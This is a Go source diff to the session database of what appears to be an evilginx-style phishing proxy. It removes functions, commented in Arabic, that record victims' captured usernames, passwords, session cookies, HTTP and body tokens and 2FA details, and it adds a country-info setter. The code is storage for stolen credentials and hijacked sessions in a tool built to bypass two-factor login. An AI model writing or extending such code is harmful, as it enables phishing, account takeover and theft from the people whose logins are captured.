@@ -3,7 +3,6 @@ package database
 import (
 	"encoding/json"
 	"strconv"
-	"time"
 
 	"github.com/tidwall/buntdb"
 )
@@ -30,31 +29,8 @@ func NewDatabase(path string) (*Database, error) {
 	return d, nil
 }
 
-func (d *Database) CreateSession(
-	sid string, phishlet string, landing_url string, useragent string, remote_addr string,
-	countryCode, countryName string,
-	deviceType, browserType, browserVersion, osType, osVersion string,
-	loginType string, has2FA bool, type2FA string,
-) error {
-	s, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
-	if err != nil {
-		return err
-	}
-	
-	// تعيين الحقول الإضافية
-	s.CountryCode = countryCode
-	s.CountryName = countryName
-	s.DeviceType = deviceType
-	s.BrowserType = browserType
-	s.BrowserVersion = browserVersion
-	s.OSType = osType
-	s.OSVersion = osVersion
-	s.LoginType = loginType
-	s.Has2FA = has2FA
-	s.Type2FA = type2FA
-	
-	// تحديث السجل بالبيانات الجديدة
-	err = d.sessionsUpdate(s.Id, s)
+func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
+	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
 	return err
 }
 
@@ -90,6 +66,11 @@ func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) er
 
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	err := d.sessionsUpdateCookieTokens(sid, tokens)
+	return err
+}
+
+func (d *Database) SetSessionCountryInfo(sid string, countryCode string, country string) error {
+	err := d.sessionsUpdateCountryInfo(sid, countryCode, country)
 	return err
 }
 
@@ -169,203 +150,4 @@ func (d *Database) GetSessionById(id int) (*Session, error) {
 
 func (d *Database) GetSessionBySid(sid string) (*Session, error) {
 	return d.sessionsGetBySid(sid)
-}
-
-// SetupSession تقوم بإعداد جلسة كاملة مع جميع المعلومات الأساسية
-func (d *Database) SetupSession(
-	sid string, phishlet string, username string, password string,
-	landing_url string, useragent string, remote_addr string,
-) error {
-	// إنشاء الجلسة
-	err := d.CreateSession(
-		sid, phishlet, landing_url, useragent, remote_addr,
-		"", "", // countryCode, countryName
-		"", "", "", "", "", // deviceType, browserType, browserVersion, osType, osVersion
-		"", false, "", // loginType, has2FA, type2FA
-	)
-	if err != nil {
-		return err
-	}
-
-	// تحديث اسم المستخدم وكلمة المرور
-	if err := d.SetSessionUsername(sid, username); err != nil {
-		return err
-	}
-
-	if err := d.SetSessionPassword(sid, password); err != nil {
-		return err
-	}
-
-	return nil
-}
-
-// UpdateSession يحدث خيارات الجلسة حسب الاسم والقيمة
-func (d *Database) UpdateSession(sid string, optionName string, optionValue string) error {
-	err := d.db.Update(func(tx *buntdb.Tx) error {
-		session_str, err := tx.Get("session:" + sid)
-		if err != nil {
-			return err
-		}
-
-		s := &Session{}
-		err = json.Unmarshal([]byte(session_str), s)
-		if err != nil {
-			return err
-		}
-
-		// تحديث حسب اسم الخيار
-		switch optionName {
-		case "username":
-			s.Username = optionValue
-		case "password":
-			s.Password = optionValue
-		default:
-			// تعامل مع الحقول المخصصة
-			if s.Custom == nil {
-				s.Custom = make(map[string]string)
-			}
-			s.Custom[optionName] = optionValue
-		}
-
-		s.UpdateTime = time.Now().Unix()
-		data, err := json.Marshal(s)
-		if err != nil {
-			return err
-		}
-		_, _, err = tx.Set("session:" + sid, string(data), nil)
-		return err
-	})
-	
-	return err
-}
-
-// UpdateSessionTokens يحدث كافة الرموز للجلسة
-func (d *Database) UpdateSessionTokens(sid string, tokens map[string]map[string]string) error {
-	err := d.db.Update(func(tx *buntdb.Tx) error {
-		session_str, err := tx.Get("session:" + sid)
-		if err != nil {
-			return err
-		}
-
-		s := &Session{}
-		err = json.Unmarshal([]byte(session_str), s)
-		if err != nil {
-			return err
-		}
-
-		// تحديث الرموز حسب نوعها
-		for tokenType, tokenMap := range tokens {
-			switch tokenType {
-			case "cookie_tokens":
-				// لن نقوم بتطبيق تحديث الكوكيز هنا لأنها تحتاج تنسيقًا خاصًا
-				// استخدم UpdateSessionCookieTokens بدلاً من ذلك
-				break
-			case "body_tokens":
-				s.BodyTokens = tokenMap
-				break
-			case "http_tokens":
-				s.HttpTokens = tokenMap
-				break
-			}
-		}
-
-		s.UpdateTime = time.Now().Unix()
-		data, err := json.Marshal(s)
-		if err != nil {
-			return err
-		}
-		_, _, err = tx.Set("session:" + sid, string(data), nil)
-		return err
-	})
-
-	return err
-}
-
-// UpdateSessionCookieTokens يحدث رمز كوكي محدد للجلسة
-func (d *Database) UpdateSessionCookieTokens(sid string, domain string, key string, value map[string]string) error {
-	err := d.db.Update(func(tx *buntdb.Tx) error {
-		session_str, err := tx.Get("session:" + sid)
-		if err != nil {
-			return err
-		}
-
-		s := &Session{}
-		err = json.Unmarshal([]byte(session_str), s)
-		if err != nil {
-			return err
-		}
-
-		// تأكد من وجود خرائط الكوكيز
-		if s.CookieTokens == nil {
-			s.CookieTokens = make(map[string]map[string]*CookieToken)
-		}
-		if s.CookieTokens[domain] == nil {
-			s.CookieTokens[domain] = make(map[string]*CookieToken)
-		}
-
-		// تحويل القيمة إلى CookieToken
-		token := &CookieToken{
-			Name:     value["name"],
-			Value:    value["value"],
-			Path:     value["path"],
-			HttpOnly: value["http_only"] == "true",
-		}
-		
-		// تحديث أو إضافة الكوكي
-		s.CookieTokens[domain][key] = token
-		s.UpdateTime = time.Now().Unix()
-		
-		data, err := json.Marshal(s)
-		if err != nil {
-			return err
-		}
-		_, _, err = tx.Set("session:" + sid, string(data), nil)
-		return err
-	})
-	
-	return err
-}
-
-// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
-func (d *Database) UpdateSessionCustom(sid string, name string, value string) error {
-	err := d.db.Update(func(tx *buntdb.Tx) error {
-		session_str, err := tx.Get("session:" + sid)
-		if err != nil {
-			return err
-		}
-
-		s := &Session{}
-		err = json.Unmarshal([]byte(session_str), s)
-		if err != nil {
-			return err
-		}
-
-		// تأكد من وجود خريطة Custom
-		if s.Custom == nil {
-			s.Custom = make(map[string]string)
-		}
-		
-		// تحديث القيمة المخصصة
-		s.Custom[name] = value
-		s.UpdateTime = time.Now().Unix()
-		
-		data, err := json.Marshal(s)
-		if err != nil {
-			return err
-		}
-		_, _, err = tx.Set("session:" + sid, string(data), nil)
-		return err
-	})
-	
-	return err
-}
-
-// UpdateSessionUsername يحدث اسم المستخدم للجلسة
-func (d *Database) UpdateSessionUsername(sid string, username string) error {
-	return d.SetSessionUsername(sid, username)
-}
-
-// UpdateSessionPassword يحدث كلمة المرور للجلسة
-func (d *Database) UpdateSessionPassword(sid string, password string) error {
-	return d.SetSessionPassword(sid, password)
 }
